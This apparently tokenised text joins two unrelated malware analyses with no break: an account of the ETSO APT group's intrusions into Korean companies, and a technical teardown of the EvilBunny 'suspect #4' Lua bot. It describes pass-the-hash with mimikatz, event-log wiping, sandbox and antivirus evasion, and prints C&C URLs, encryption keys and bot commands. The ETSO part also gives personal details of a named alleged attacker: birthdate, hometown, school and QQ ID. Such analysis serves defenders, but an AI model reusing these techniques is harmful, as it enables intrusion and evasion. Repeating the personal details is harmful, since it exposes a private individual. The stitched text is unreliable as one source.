In early days , ETOS hacking group used random file names , algorithms , and path for installing malicious files .
As time passed , however , they changed the naming scheme to sound similar with normal file names or system rules making malicious codes detection difficult .
This is the first stage where the attacker first tries to enter the company 's internal network .
Many times , the ETSO Attack Group targets the update server , which is the most frequently used application program in the company .
The attacker will seize the server and change the settings so that the malicious codes are downloaded on a specific target system .
Another method is to disguise itself as an internal mail , enticing the user to open and execute the file .
In this case , the attacker disguises oneself as an employee from a security division , sending out email with a malicious hyper link .
It has been found that the attack email is written in Korean , indicating that there are native Korean speakers in the ETSO Attack Group .
The attacker that succeeded in initial attack creates a backdoor to the system and prepares a path for continuous attack .
In this case , the first attack is mainly made on the employee 's network regularly used for general work .
In the case of the ETSO Attack Group , the back door generation program made it possible for many techniques to be executed with a variety of `` back doors '' to communicate with the C & C .
The common functions of each of the back doors are as follows : - System Information and Control - Search option - File transfer to C & C server - Control of process and module - Service control - Registry control - Instant screen capture - Remote control - Command Shell - Proxy function ( open port ) - Keylogging In addition to the above mentioned ways , in order to secure the additional attack route to the network , the ETSO Group uploaded the back door on the internal file server that was openly shared within the company .
The uploaded back door was disguised as a generally used program such as a driver , Office or Chrome install file .
Such disguised features induce users to install the file .
The attacker who successfully installed the back door on the initial attack , then moved on to the target system .
In order to progress , the attacker needed to access an account from a higher authority such as information from an administrator , including ID , password and NTLM Hash information , all available in the system registry and memory .
In the case of the ETSO Group , they would use existing tools such as gsecdump , WCE ( Windows Credential Editor ) , mimikatz or insert the DLL ( wceaux.dll , sekuralsa.dll ) in the malicious code , dropping and calling the information .
In addition , the attacker may use its key logging function from the backdoor to steal the ID / Password .
For the sake of convenience , the same IDs and Passwords are mainly used for all of the local system administrators .
Also , a domain administrator account is used to access more than one system in the active directory setting .
In this case , the attacker can easily acquire the administrator 's ID / Password as well as the hash value .
The attacker who obtained the account information of privilege authority then created a back door to the system .
In this case , if the acquired account was the domain administrator 's , then the attacker could install back doors on all of the corresponding parts of the domain as well as the domain and systems in trust relations .
The install process is as follows : The attacker will use the acquired ID / Password or NTLM Hash value to create an agreement with the system network to move to , and copy , the back door .
The copied backdoor is then executed using the work scheduler , and it is operated using the system authority .
The executed back door then broadcasts connection status with the C & C server using the proxy feature , and the attacker approaches the corresponding system based on the broadcast information .
The attacker repeats the process until the target system is found , such as a DB .
In most cases , the attacker will search for an administrator 's system inside the network , approach the gateway server and finally enter the server network .
From then on , the attacker uses the same method and installs many back doors in the server network .
The attacker uses various Reloading Point techniques in order to maintain the connection between the installed back door and the C & C server .
First , a Bootkit technique will be used to load the backdoor after transforming the MBR .
The characteristic of the bootkit is that the corresponding bootkit is encoded with XOR on the loading data inside the trash and it is saved .
Another method is to use files such as wiarpc.dll , tsvipsrc.dll which are loaded automatically during booting .
The malicious file such as the DDL is saved under folder 32 and is used during the back door reloading .
Registering the back door as a general service is also one way it may be used .
The attacker uses various kinds of anti - forensic techniques in order to avoid being disconnected with the C & C server once the back door is discovered .
The backdoor install file and batch file are copied by network sharing , and the batch file is executed with the work scheduler .
The batch file executes the back door install file and deletes the install file as well as the work schedule file ( .job
) , and the cl of the wevtutil command is used to delete the event logs ( security , system and application ) .
Additionally , the registry key values are deleted in order to erase traces of the back door execution into the service .
With these anti - forensic techniques , the attacker reduces the backdoor detection rate , avoiding the chances of being caught by back tracing .
In addition , a method of installing backdoor only in the memory area was applied , since this can avoid the threat detection of security products .
After installation , the backdoor erases all of the files and only exists in the memory while waiting for the system to turn off .
When the system is turned off , the files needed for back door reloading are generated and they are loaded during system booting .
Then , the loaded back door erases all of the related files and stays only in the memory .
Even though administrators and analysts detect back doors and delete them , the attacker will install even more back doors on the system to maintain its connection with the C & C server .
The attacker who approaches the DB server will proceed with various kinds of tasks depending on the attack purpose such as attacking the cyber money or stealing personal information .
In the case of a cyber - money update , a query request is made on the DB using the features embedded on the back door and by SQLCMD.EXE .
Or , the existing Stored Procedure is changed to update .
When the Stored procedure registered in the mail table is changed and the mail is received , the Stored Procedure is operated to update the cyber money of a specific character .
Also , the DDL which is used in the MS SQL DB which transforms the opends60.dll ( SQL Open Data Services DLL ) , can be used to update the cyber money .
In case of information leakage , a DB for a customer information dump file is generated , compressed as BZIP ( bz2 ) and exported out using FTP .
On the top portion of the master , there are two main menus : agent list and agent master .
The center area shows the directory of the agent lists which are connected , and the bottom portion shows variety of options related to the master .
In the initial access , a request for connection is made from an infected remote PC to the master .
If the Three - Way Handshake is made between the two , the PC and master will be connected and the information of infected PC will be delivered to the master .
Then , after every 60 seconds , the Keep - Alive traffic will be created to check the connection between the master and the infected PC .
In the same OS environment , the same IP and Port were used during the test .
It has been found that the traffic is different in its delivery over the same command .
After repeated tests , a pattern was found in the traffic between the infected PC and the master .
Thus , it is surmised that it was not completely encrypted but was encoded by a certain level .
Including the initial connection , the traffic encoding was also applied in the Keep - Alive traffic and in the all command transferred traffic .
The Key logging and CMD command results were also not delivered in plain text but in encryption .
Currently , the communication between the ETSO malicious code master and the agent is being encrypted .
It seems impossible to create a PCRE and REGEX pattern which can be blocked by IDPS and other network security system .
Regarding the newest version of ETSO , it is assumed that there must be a telecommunicating module hiding within the network traffic .
The question is thus raised regarding who actually made the ETSO Attack tool in the first place .
An investigation was conducted to find the ESTO APT creator as the ETSO master 's traces were traced back in the analysis .
In the ETSO master , you can see the http access on the lower menu of the malware toolkit ; the Baidu URL values are seen .
Baidu is the largest portal site in China .
In the middle , you can see the string `` DZKSJDADBDCDH - DOCADOCADOCBDDZJS '' .
The string appears when the IP is entered and information is changed , setting the initial value to be `` 127.0.0.1 '' .
At this time , the value DZKSJDADBDCDHDOCADOCADOCBDDZJS is set .
Through a Google search of the ' DZKSJDADBDCDHDOCADOCADOCBDDZJS ' string on the malware toolkit , a link of ' http : //tieba.baidu.com / p/1103191865 ' was found .
There were reply messages titled TEST and all of the messages were submitted by a person with the ID `` whg0001 '' .
This value matches the one on the ETSO malware toolkit .
It is assumed that the attacker designated a specific blog address when the ETSO APT malicious code agent was activated in order to immediately determine whether the attack was successful or not .
The attacker can know the victim 's IP address after decrypting the encryption .
It is assumed that the according blog content is related to the APT tool creation .
Thus , a further investigation was made on the person with the ID of whg0001 .
When the link of whg0001 is clicked , brief information on the person with the ID whg0001 appears .
He is a male who was born and still lives in Szechuan , Chengdu .
Below is the translation of the detail information : < table Gender Male , Birthdate Jan 1 1991 Basic Info Place of Birth Szechuan , Chengdu , Chengyang Qu Current Address Szechuan , Chengdu , Chengyang Qu Body Figure Slim Marital Status Married Non - smoker , occasional drinker , likes to take Habit naps during the day Detail Info Personality Cheerful and calm personality Highest Education University Major Computer Science / Network < /table On his blog , whg001 wrote on Aug. 17 , 2011 , `` I visited my home school a couple days ago .
Looking back , those were the happiest days .
'' It has also been found that the comment came from the free - board of Jipu High School .
Thus , it has been determined that whg001 attended Jipu High School .
According to the writings on the board and the content of whg0001 's blog , the name of the writer is Jiao Xang Bo , who entered high school in 1994 in homeroom number 4 .
Also , he was looking for a classmate by leaving a message with his QQ ID .
whg0001 's QQ ID is found to be ( 312016 ) .
After investigating the personal information of whg0001 , further investigation was made of his online activities .
As a result , it has been found that he left comments on the attacker 's freeboard regarding the design of Trojan horse ( Refer to Figure 27 ) .
Unfortunately , the attacker freeboard does not exist anymore .
[ Figure 24 ] translates as follows : 1 .
I have realized all of the packets ' MIMA ( password / man in the middle attack ) different when designing the Trojan horse .
2 .
To go around the vaccine detection , a transformation and other technologies were used to on the Trojan horse .
To find the document made by whg0001 , the ID was used to search on Baidu .
As a result , a document titled `` VTCP Introduction and Entry ( V11.X ) '' was discovered .
To take a closer look at the document , a link ( ' http : //wenku.baidu.com / view/2005a703-bb68a98270fefa06 ? fr = prin ' ) was accessed ( as of August , www.cnasm.com , the address mentioned within the document , was no longer accessible ) .
Using the QQ ID ( 312016 ) above , the result of the QQ main page was as follows : In [ Figure 26 ] , the Chinese characters wu hua guo appear .
The first letter of each synonym has been used as an ID .
So far , the following information has been collected on the attacker who created the ETSO with ID of whg0001 ( refer to Table 7 ) : The Chinese - originated APT Attack Group ETSO has been attacking South Korea since 2011 .
A - FIRST from AhnLab has done a forensics analysis using the ASDE ( AhnLab Smart Defense Enterprise ) network and on the damaged company for years .
According to the study , ETSO is different from other attackers in following ways : - ETSO analyzes the update structure of a product popularly used in South Korea , in order to distribute malicious codes through reliable products and ultimately , the company .
- To continuously benefit monetarily and acquire extra information , the ETSO Group does not destroy the infected system and the infrastructure .
- By disclosing the digital certificate , additional damage is made on the target company because the certificate can be used in other attacks for different purposes .
- The attacker moves into the internal system by seizing the AD server of the company to attack , using the pass the hash attack .
- Regarding the malicious code file naming , a ' DLL search order hijacking ' is used ( for example : wiarpc.dll , tsvipsrc.dll ) .
-Not only was the feature embedded on the back door used to attack the cyber money update , but a direct DB query through SQLCMD.EXE , Trigger through the transformation of Store Procedure registered in the email table and opends60.dll ( SQL Open Data Services DLL ) transformation were all used in the MS SQL DB in the attack .
Suspect # 4 is the fourth out of a row of malware samples , which are believed to stem from the same malicious actor .
Insights on the campaign were first presented at Hack.lu Conference 2014 in Luxembourg .
The name ' EvilBunny ' is derived from a link to debug information embedded in the dropper binary of suspect # 4 .
The path to the associated .pdb - file
contains the name of the project and sub project , namely ' bunny 2.3.2 ' and ' Transporter2 ' .
EvilBunny has been seen spreading through a malicious PDF document , exploiting CVE- 2011 - 4369 on 20th of December 2011 .
The exploit would download the bunny dropper and install suspect # 4 on the infected system .
Both , dropper and payload were compiled on 25th of October 2011 , while CVE-2011 - 4369 was released only on 16 th of December .
It is unclear as of when the attacks started ; although , clearly , either the attackers adopted the vulnerability within 4 days or the attacks were performed using an AdobeReader 0-day .
The functionality of the dropper can be summarized in the following steps : • Sandbox check and anti virus product enumeration • Dropping payload ' netmgr.exe ' • Creating a registry key for persistence • Creating a registry key for deletion of the dropper Searching for a sandbox environment , the malware takes a number of simple steps to verify .
It tests the module file name to see if it is less than 5 characters long or if it contains either of the four strings ' klavme ' , ' myapp ' , ' TESTAPP ' or ' afyjevmv.exe ' .
Also , it verifies if less than 15 processes are running in the environment , using the API call EnumProcesses .
In case any of the conditions is met execution will abort .
Up to the time of writing it remains unclear which environment the mentioned strings aim to identify , if any .
Accessing the systems WMI ( Windows Management Interface ) the malware queries the installed AntiVirus software by issuing ' SELECT * FROM AntiVirusProduct ' .
More specifically , the malware is interested in the data fields ' productUptoDate ' , ' VersionNumber ' , ' DisplayName ' and ' productState ' .
The information about AntiVirus provided by WMI differs between Windows versions , so the requests address different namespaces , ' ROOT\SecurityCenter ' for WindowsXP and ' ROOT\SecurityCenter2 ' for Windows Vista and newer versions .
Names of AntiVirus products are represented as hard coded SHA-256 hashes , namely the following : d4634c9d57c06983e1d2d6dc92e74e6103c132a97f8dc3e7158fa89420647ec3 4db3801a45802041baa44334303e0498c2640cd5dfd6892545487bf7c8c9219f bfe74ca464620a62f11b8c47a3778bb132d84fecd90ce7c75817970f2eeeca51 Antivirus 443b6fb65fa57d57ee3113e48e9b4ed1db2921d5352e27fa85064cd60553c3ff BitDefender e1625a7f2f6947ea8e9328e66562a8b255bc4d5721d427f943002bb2b9fc5645 588730213eb6ace35caadcb651217bfbde3f615d94a9cca41a31ee9fa09b186c f1761a5e3856dceb3e14d4555af92d3d1ac47604841f69fc72328b53ab45ca56 Kaspersky Only three of the seven hashes were identified .
If any of the indicated products is installed and active on the machine execution will abort .
The dropper comes with its payload attached in the resource section .
The resource RCData contains the entire netmgr.exe binary ; alleged suspect # 4 .
The binary is dropped as netmgr.exe , either located in % APPDATA % \Perf Manager\ or % WINDIR % \msapps\ .
The final directory location depends whether the dropper is running with administrative privileges or not .
Interestingly , the dropper also changes the creation time stamp of the newly created binary to time stamp of the system executable explorer.exe .
This serves to avoid raising suspicion of a forensic analysts or tools .
As a means of persistence the dropper creates an entry under [ HKLM| HKCU ] \ ...
\CurrentVersion\Run which points to the dropped netmgr.exe binary .
This ensures that netmgr.exe will be executed every time the system boots .
Furthermore , the dropper generates another entry in the Windows registry , under [ HKLM| HKCU ] \Software\Microsoft\IPSec .
This entry is named ' isakmpAutoNegociate ' and points to the dropper binary .
This key will be requested by netmgr.exe later to locate the dropper binary and delete it .
The naming of the key for cleanup of the dropper is chosen to confuse analysts , although the name is clearly misspelled .
Another interesting side fact is that the dropper does not start the dropped malware , neither does it contain code which could even do so .
This implies , the final infection stage does not start unless the infected machine is rebooted .
Also , the dropper binary will not be deleted in the meanwhile .
Suspect # 4 was the fourth discovered sample in a row of malware related to the EvilBunny attacks ; even before its dropper .
Yet , it is by far the most interesting one .
It is a multi- threaded bot with an integrated scripting engine .
It incorporates a Lua engine and downloads and executes Lua scripts to reach a certain level of polymorphism .
The Lua scripts can call back into the C++ code to alter the malware behavior at runtime .
The malware seeks to keep a low profile on the infected machine , while executing the botmaster 's commands and Lua scripts .
In total Suspect # 4 exhibits three different methods for receiving C & C input and executing commands ; directly via HTTP , through a downloaded database file or as a scheduled task .
Also , the malware will generate numerous files to help its execution and frequently reply back to the C & C with status messages .
The initial purpose of the malware seems to be sharing execution load among infected host machines .
However , due to the lack of the original Lua scripts and the extensive functionality of the embedded Lua engine the original intentions of the attackers remain unknown .
Suspect # 4 is written in C++ , and just like its dropper , it is not protected by any runtime packer or crypter .
It is , however , compiled with a performance optimization option which causes a lot of code in - lining and duplicate code in the binary .
Duplication also applies to string constants , as every string is present once per function , if the given function uses it .
This might accelerate execution speed of the bot at runtime , but implicitly or even on purpose hinders static analysis of the binary code .
Cross referencing of strings or helper functions is ineffective due to the duplications .
Only few anti - analysis measures can be found in the binary .
One function exists , which resembles the sandbox check of its dropper with minor extensions .
This sandbox detection consists of three parts : • The module path name should be more than 5 characters long and contain either ' msapps\ ' or ' Perf Manager\ ' , which is the case if the sample was legitimately dropped by its dropper .
• The module file name should not contain either of the following strings : ' klavme ' , ' myapp ' , ' TESTAPP ' or ' afyjevmv.exe ' .
• The function performs a hook detection on time retrieval APIs .
These are NtQuerySystemTime , GetSystemTimeAsFileTime and GetTickCount .
Every API is called twice to calculate a delta , while performing a sleep ( 1000 ) operation between iteration one and iteration two .
The final condition is , if any of the three deltas is below 998 milliseconds execution will abort .
This can only be the case if any of the three API 's return values is modified by a system monitoring solution , like a sandbox .
Another evasion trick implemented by the malware is the partial obfuscation of API names .
For no obvious reason though , the obfuscation algorithm is only applied to a small subset of APIs used in the code .
The algorithm uses the fixed value AB34CD77h and a combination of XOR and ROL instructions to calculate hashes from the export names of kernel32.dll , advapi32.dll and psapi.dll .
It is important to note that this obfuscation trick and the according hash function remain consistent through out all related samples .
Similar to its dropper , suspect # 4 enumerates the system 's installed AntiVirus product and checks firewall settings .
For AntiVirus detection it utilizes WMI and issues ' SELECT * FROM AntiVirusProduct ' .
Identification of installed products is achieved by comparing the hashed product name to a set of SHA-256 hashes ; although , a different and much bigger set than used by its dropper .
With the help of hash tables from perturb.org and md5decoder.org it is possible to revert some of the hashes to their original text form : a48be88bed64eff941be52590c07045b896bc3e87e7cf62985651bbc8484f945 MAfee 1ba035db418ad6acc8e0c173a49d124f3fcc89d0637496954a70e28ec6983ad7 a7f9b61169b52926bb364e557a52c07b34c9fbdcd692f249cd27de5f4169e700 2bc42b202817bdab7d49506d291e3d9624ae0069087a8949c8fcb583c73772b1 Norton f7d9ea7f3980635237d6ea58048057c33a218f2670e0ff45af5f4f670e9aa6f4 Panda 522e5549af01c747329d923110c058b7bb7e112816de64bd7919d7b9194fba5b Rising 4db3801a45802041baa44334303e0498c2640cd5dfd6892545487bf7c8c9219f d4634c9d57c06983e1d2d6dc92e74e6103c132a97f8dc3e7158fa89420647ec3 9e217716c4e03eee7a7e44590344d37252b0ae75966a7f8c34531cd7bed1aca7 Trend e1625a7f2f6947ea8e9328e66562a8b255bc4d5721d427f943002bb2b9fc5645 588730213eb6ace35caadcb651217bfbde3f615d94a9cca41a31ee9fa09b186c ab6ed3db3c243254294cfe431a8aeada28e5741dfa3b9c8aeb54291fddc4f8c3 b3fe0e3a3e3befa152c4237b0f3a96ffaa44a2d7e1aa6d379d3a1ab4659e1676 AntiVir 0d21bd52022ca7f7e97109d28d327da1e68cc0bedd9713b2dc2b49d3aa104392 c0ffcaf63c2ca2974f44138b0956fed657073fde0adeb0b1c940b5c45e8a5cab avast 249a90b07ed10bd0cd2bcc9819827267428261fb08e181f43e90807c63c65e80 AVG b39be67ae54b99c5b05fa82a9313606c75bfc8b5c64f29c6037a32bf900926dd 4b650e5c4785025dee7bd65e3c5c527356717d7a1c0bfef5b4ada8ca1e9cbe17 CA c8e8248940830e9f1dc600c189640e91c40f95caae4f3187fb04427980cdc479 97010f4c9ec0c01b8048dbad5f0c382a9269e22080ccd6f3f1d07e4909fac1a5 aa0ad154f949a518cc2be8a588d5e3523488c20c23b8eb8fafb7d8c34fa87145 333e0a1e27815d0ceee55c473fe3dc93d56c63e3bee2b3b4aee8eed6d70191a3 G 977781971f7998ff4dbe47f3e1d679f1941b3237d0ba0fdca90178a15aec1f52 Jiangmin f1761a5e3856dceb3e14d4555af92d3d1ac47604841f69fc72328b53ab45ca56 Kaspersky The malware retrieves the attributes ' productState ' , ' DisplayName ' and on WindowsXP also ' productUptoDate ' .
It is noteworthy though , that for netmgr.exe the existence of any of the indicated AntiVirus products does not pose a reason to end execution .
In fact , these hashes are the only measure for obfuscating strings in the binary .
Firewall detection works equally via querying WMI through `` SELECT * FROM FirewallProduct '' , while this time the malware searches for the attributes ' enabled ' , ' VersionNumber ' and ' DisplayName ' .
AntiVirus and firewall information is stored in objects in a linked list at runtime .
It will later either be exfiltrated to a C & C server directly or dumped to a local file on disk .
Either way , the results of this check do not influence the flow of execution .
After start - up the malware aims to inject itself to an svchost.exe process .
For stealthiness the malware can either inject itself as a remote thread to a running svchost.exe process or perform the same procedure on a newly created one .
As a singular means of persistence the malware relies on the auto - start registry key created by its dropper under [ HKLM|HKCU ] \ ...
\CurrentVersion\Run , which will start netmgr.exe on every system boot .
Also , the payload retrieves the dropper 's path from ' isakmpAutoNegociate ' under [ HKLM| HKCU ] \Software\Microsoft\IPSec , then deletes the binary and the ' isakmpAutoNegociate ' registry key .
At start - up netmgr.exe decrypts a configuration file stored in its resource section , revealing three URLs , among timeout settings and encryption keys : • http : //le - progres.net / images / php / test.php ? rec=11206 - 01 • http : //ghatreh.com / skins / php / test.php ? rec=11206 - 01 • http : //www.usthb - dz.org / includes / php / test.php ? rec=11206 - 01 All three of these URLs served as C & C contacts when the attack was still ongoing , sending commands or Lua scripts to the infected host .
Interesting is that two of the domains are actual fake domains resembling legitimate websites while one is a legitimate domain nowadays .
Le - progres.net could be easily confused with leprogres.fr , the official website of the Lyon news paper Le Progres .
Usthb - dz.org is remarkably similar to usthb.dz , the website of the University of Sciences and Technology Houari Boumediene in Algiers , Algeria .
The third domain though , ghatreh.com , is the legitimate address of an Iranian news website .
According to domaintools.com , this domain has been created in November 2004 while the last change happened in September 2012 .
Also , domaintools.com reveals 14 unique IP addresses and 4 different registrars .
It is assumed that the domain has been dropped by the attackers in 2012 and picked up by legitimate operators .
The IP addresses of the domains in 2011 , at a time when dropper , payload and C & Cs were still active , were 69.90.160.65 , 70.38.107.13 and 70.38.12.10 .
All three IPs are located in Canada , two relate to Montréal , one to Oakville .
The complete passive DNS history can be reviewed in appendix A .
The binary also contains the URL ' http : //1.9.32.11/bunny / test.php ? rec = nvista ' , but the purpose of it remains unclear .
This IP address is never contacted by the malware .
Find the entire decrypted configuration below : < COMMAND_KEY > wqNbo8DSbWZiq1QZ4NnmTcibYRJIFxmlSBQh1zdF8IlDKin2zkNOVtKvlx92Q0QOQnA Nt1NCbDItwVQWY0HBQ2GKYPecpfuQ6JPZG0dQRarhCy7nTT3ukET9YzQEPN81 < /COMMAND_KEY > < STORAGE_KEY > lbuLmdAouhUkSsMXckMUevjNf87S4ATWYwLYGLM44O1ortQEE2vr34QGzjPhrWeosFB YQpT6dRwDuPPuP13zzqZhW3PeCQA7OUEghovMwEGYx1annboIwRxKbhUOIMsf < /STORAGE_KEY > < RESPONSE_KEY > 8kMQOWondQc2ZgYgirg9NHg0QUiIIBdPe0YtIVfvxa9rvJ9wtFGx8ko4oFY34PrSkW 9cKzEFZYDnM54qeWcvSMIi9sBAkcD5ggFDmQOGdO42ef344I7s9wAKoAXKeq1s < /RESPONSE_KEY > < COMMAND_FILE_PATH_AND_PREFIX > % SELFDIR % \net.cap < /COMMAND_FILE_PATH_AND_PREFIX > < URL1 > http : //le - progres.net / images / php / test.php ? rec=11206 - 01 < /URL1 > < URL2 > http : //ghatreh.com / skins / php / test.php ? rec=11206 - 01 < /URL2 > < URL3 > http : //www.usthb - dz.org / includes / php / test.php ? rec=11206 - 01 < /URL3 > < INJECTED > 0 < /INJECTED > < STARTDELAY > 0 < /STARTDELAY > < DIEDELAY > 120 < /DIEDELAY > The configuration provides three keys for encryption and decryption of data .
The command_key is used to decrypt commands received from the C & C server , the storage_key is used to encrypt and decrypt data being stored to files on disk and the response_key will encrypt callbacks to the C & C server .
All data exchanged with any of the C & C servers as well as data stored to a file on disk is encrypted with the according key .
Diedelay and startdelay are timeout settings , the exact use of the parameter injected is unclear up to the time of writing .
Command_file_path_and_prefix defines the name of the file which will holds C & C commands and Lua scripts at runtime .
The malware performs C & C command parsing and Lua script execution with dedicated threads , of which every thread creates its own net.cap file , extending the name by a fixed digit namely 0 , 1 , 3 or 4 .
At runtime the malware adds additional configuration parameters , which are not assigned an obvious name like those retrieved from the resource section .
The synonyms for all encrypted configuration values as they are stored in Windows registry are : – ipsecFilterData – ClassID – ipsecID – ipsecISAKMP – ipsecData – ipsecDSA – ipsecSA – ike – ikeID – isakmpID – isakmpKey – HMACSHA1 – isakmpData After the configuration is retrieved from the resource section the malware will create a subkey for every parameter under [ HKLM|HKCU ] \Software\Microsoft\IPSec .
This key has initially been created by the dropper .
The attributes are encrypted before being written to registry , and will be decrypted on the fly every time the malware requests a specific parameter .
Suspect # 4 comes with a solid multi - threading model , which seeks to assure fail - safe and high - performance execution .
The malware runs a main thread , which manages four worker threads and performs C & C command parsing and Lua script execution .
The worker threads are dedicated to receive commands and scripts through different ways .
Next to that , the main thread also runs sub threads to maintain log files the malware creates at during execution and to keep track of the overall system load the malware creates .
The threads are coordinated via named events , global flag variables , in some cases also mutexes or semaphores are used .
The main action of the malware is carried out in the main thread , which parses commands and executes Lua scripts , provided by the worker threads via command files .
The threading model is summarized in the following graphic .
A dedicated thread is present for monitoring the CPU load the malware itself generates .
Therefor the thread enumerates all threads from the current process and calculates their execution time .
The user- and kernel land execution time is measured for every thread using the kernel32 ! GetThreadTimes API ; then aggregated , so the final value holds the overall CPU usage time of the malware process .
The thread keeps track of the time passing between executions .
If the malware 's active execution time in percentage of this delta exceeds a configured threshold , the malware will suspend all threads of its process for at least 5s .
The threshold is retrieved from configuration in Windows registry , and can be controlled by the botmaster via the C & C command setcpulimit ( see section 2.5 ) .
This clearly is an attempt to keeping a low profile on the infected machine .
By maintaining its own execution load the bot 's compromised svchost.exe process will not catch attention on the process list .
The backfile launching thread got its name from the named event ' backfilelaunching ' which is set to indicate that the dedicated thread has started .
Also in a 1s - frequency the malware runs the backfile thread to push dump files to one of its remote servers .
The files are named Perflib_Perfdat_dmpbX.dat , where X is an index number starting with 0 .
The data written to the file are status messages including a time stamp , which are returned by command and Lua script execution .
The data is encrypted using the response_key from the configuration .
The term ' hearer ' can be found plenty of times in the binary , it is assumed that it is equivalent to ' listener ' of some sort .
All together suspect # 4 manages 4 hearer threads including one command file per thread .
The command file is named net.capX , where X is the index of the thread ; 0 , 1 , 3 or 4 .
The hearer thread 's purpose is to receive instructions from the remote servers and provide them to the main thread .
Such instructions are commands and/or one or more Lua scripts .
Each hearer has a dedicated method to receive instructions which is either separately via HTTP from the server , aggregated through a downloaded data file or as tasks to be configured as scheduled tasks .
The hearer threads dump the received instructions to their net.cap-files , from where the main thread 's command parsing routine fetches and executes them .
The data is encrypted with the storage_key before written to disk .
Generic hearer thread .
Started , but not involved in command fetching and parsing .
Hearer 1 receives commands and Lua scripts directly via HTTP from one of the C & C servers .
These are encrypted with the storage_key and stored to net.cap1 in the malware 's working directory .
Interestingly , the malware handles successful downloads with the HTTP status code 418 .
This code is not part of the original HTTP standard , but was introduced in RFC2324 , 1998 's traditional IETF April Fool 's joke .
The textual representation of status 418 is `` I ' m a teapot . '' .
Hearer 2 is responsible for managing the scheduled tasks , titled ' crontasks ' by the malware .
The tasks are stored in a file named perf.tmp , and when due for execution are copied to the according net.cap-file , net.cap2 in this case .
From there the main thread can fetch and execute them in its command parsing loop .
Hearer 2 also creates a swap file named perf.tmp2 , which helps in selectively editing the initial task file and in managing the task list .
Hearer 3 searches for a file named netdump.db in its local working directory .
If found , the thread will read its content in chunks representing different commands and paste these to net.cap3 .
Again , the data is encrypted with the storage_key .
No functionality could be found in the malware code to write to netdump.db , which leaves the conclusion that this file will be downloaded from a C & C server .
After initializing and starting all four hearer threads the main thread enters a command parsing loop .
For every hearer the main thread invokes the command and script execution function .
Therefor data is read from the encrypted net.capX- file , where X indicates the index of the hearer ; 0 , 1 , 3 or 4 .
Once decrypted , this data is parsed to find valid C & C commands and / or valid Lua scripts to execute .
More details on command and script execution can be found in section 2.6 . Notable is that the command parsing and execution happens in a serial fashion , while Lua script execution is handed over to dedicated threads .
Also , no direct relation between C & C commands and Lua script execution could be identified .
The most notable actions of the bot can be summarized as follows : • Downloads and executes Lua scripts to instrument its own code • Can install managed tasks ( named ' crontask ' ) for its integrated engine • Can maintain FTP connections • Can send and receive files via HTTP • Writes runtime information to local files • Encryption for local data and network communication However , suspect # 4 does accept a list of hard coded commands to be sent by the C & C server .
These mainly serve the purpose of controlling operation of the bot on the infected machine , such as restarting threads or setting configuration parameters .
The full list of C & C commands can be found below : mainfrequency – Set a new timeout value for the command parsing loop .
getconfig – Get configuration from registry and push it to C & C .
ftpput – Push a file to an FTP server .
ftpget – Download and store a file from an FTP server .
sendfile – Send a local file to one of the C & Cs .
getfile – Download and store a file from one of the C & Cs .
uninstall – Set runtime flags to instruct main thread to terminate and delete related files .
restarthearer – Restart one of the hearer threads , clean its runtime files .
restart – Set runtime flag to instruct main thread to restart all threads .
cleanhearer – Clear all files related to an indicated hearer thread .
timeout – Configure a timeout value for HTTP connections .
waitfor – Set a timeout value for hearer 1 . updatedietime – Update the dietime value in registry .
crontaska – Add new task to perf.tmp for hearer 2 to execute .
crontaskr – Remove an entry in perf.tmp .
crontaskl – List tasks from perf.tmp , write to perf.tmp2 and send to C & C .
maxpostdata – Set a limit for data size to be sent to C & C via registry to limit data traffic .
seturl – Add an additional C & C server URL to configuration in registry .
stop – Set runtime flag to instruct main thread to shut down .
setcpulimit – Configure a limit in percent for CPU usage , stored in registry .
Every command execution function returns a status line , such as for example `` ftp command succeeded for : % s ! \n '' .
The initial command , the status line and a current time stamp are encrypted and sent back to the C & C server .
Additionally , the same data is written to the Perflib_Perfdat_dmpbX.dat file which is regularly pushed to the C & C by the backfile thread .
For hearer 1 and 3 the command parsing routine will additionally manage two continuous log files which are named Perflib_Perfdata41X.dat and Perflib_Perfdata_42X.dat , where X is the respective hearer thread 's index .
More specifically , command parsing will increment a global variable holding the total amount of executed commands and scripts .
This 4-byte value is appended to Perflib_Perfdata41X.dat before and Perlfib_Perfdata42X.dat after command execution .
These files survive restart or cleanup , so every time the malware boots it reads the current status from these logs and continues from the latest value .
This mechanism helps the botmaster to keep track of the bots activity on an infected host and could also be helpful in trouble shooting .
Suspect # 4 incorporates an interpreter for Lua 5.1 , LuaSocket 2.0.2 and C / Invoke Lua bindings .
Lua is a lightweight programming language designed as a scripting language which can be embedded into applications , providing a C API for doing so .
C bindings are provided through C / Invoke and enable Lua scripts to perform callbacks to C / C++ code .
This constellation can be found in many video game engines to provide polymorphic behavior in games .
Engine and game play features are injected through Lua scripts , which instrument the game engine code .
The Lua interpreter is very small , compiled roughly 180kB , thus can easily be integrated in an application .
The C / Invoke bindings enable Lua to be completely independent from the C / C++ application , so injected scripts can be pure Lua code .
A script , if delivered to one of the hearer threads , will be provided through the corresponding net.cap-file of the hearer along with a C & C command .
If a script is included in the data read from the net.cap-file , this is indicated by the start sentinel ' < $ ' .
Likewise , the end of a script is indicated by ' $ > ' .
Command execution goes hand in hand with Lua script execution , thus is dependent of the four hearer threads .
The work flow for each hearer per execution loop in the main thread is as follows : • Read and decrypt content from according net.cap-file • See if an entry of the C & C command list can be found in the decrypted data • If so , execute the command • Hand the data over to the Lua interpreter thread • See if a Lua script can be located , searching for start and end sentinel • If so , start Lua thread and execute script • If more than one script can be found start more Lua threads recursively After starting the Lua thread requests a value from Windows registry named ' EnableLua ' under SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System .
This key name stands for enable limited user account .
When set to zero this key effectively disables UAC ( User Account Control ) .
The malware only requests the key value but does not change it .
The value is later used by a callback function named ' popenWin ' to decide on a way how a sub process should be started .
Options are via WMIC using wmic.exe , Microsoft CScript engine using cscript.exe or directly via spawning a command line through cmd.exe .
However , spawning sub processes is not the only feature which comes with Lua .
The Lua interpreter is a powerful code base which enables suspect # 4 to change functionality on the fly , as different scripts are downloaded and executed .
The scripts define the functionality as they perform callbacks to the C / C++ code in the malware binary .
The potential of the Lua interpreter can be investigated on the project homepage .
Like command execution , Lua script execution also returns a status message which is extended by a time stamp and forwarded to one of the C & C servers , as well as written to the backfile log in Perflib_Perfdat_dmpbX.dat .
Likewise , the Lua threads log their activity to Perflib_Perfdata_41X.dat/42X.dat .
Due to the absence of C & C servers which hold the Lua scripts for the bot 's Lua interpreter the true nature of this feature remains unclear .
